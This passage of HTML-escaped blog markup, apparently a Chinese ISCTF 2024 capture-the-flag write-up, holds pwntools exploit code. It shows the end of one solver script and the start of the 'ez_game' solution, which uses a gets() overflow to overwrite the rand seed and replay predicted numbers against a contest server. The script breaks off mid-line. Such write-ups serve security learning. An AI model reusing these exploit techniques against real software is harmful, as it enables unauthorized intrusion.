data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# debug()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# for i in range(5):&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ru&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;birthday\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ru&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;birthday\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ru&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;birthday\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ru&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;birthday\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ru&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;birthday\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x11111111&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ru&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;birthday\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# debug(&#39;b* 0x4012cd&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x40121E&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;it&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/1.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ez_game&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ez_game&#34;&gt;#&lt;/a&gt; ez_game&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/6.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;种子为 1，伪随机，同时给了 gets 无限溢出漏洞，可以将种子覆盖掉，alarm 有限制时间，但是在交互时候 alarm 在输入很快并没有什么影响。所以 exp 传 20000 次伪随机数即可&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;huan_attack_pwn&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# from LibcSearcher import *&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; ctypes &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arch&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; os&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# context(arch=&#39;i386&#39; , os=&#39;linux&#39;, log_level=&#39;debug&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;binary &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;./ez_game&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;27.25.151.12:25484&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\033[31;40mremote\033[0m: (y)\n&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#39;\033[32;40mprocess\033[0m: (n)&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;y&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binary&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# r = gdb.debug(binary)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; cdll&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;LoadLibrary&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# libc = ELF(libc)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;elf &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binary&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# srand = libc.srand (libc.time (0)) #设置种子&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;default &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;se      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; data                     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sa      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; delim&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data              &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delim&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sl      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; data                     &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sla     &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; delim&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data              &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delim&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rc      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; numb&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4096&lt;/span&gt;                &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;numb&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rl      &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;lambda&lt;/span&gt; time&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;default             &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;time&lt;span class=&#34;token 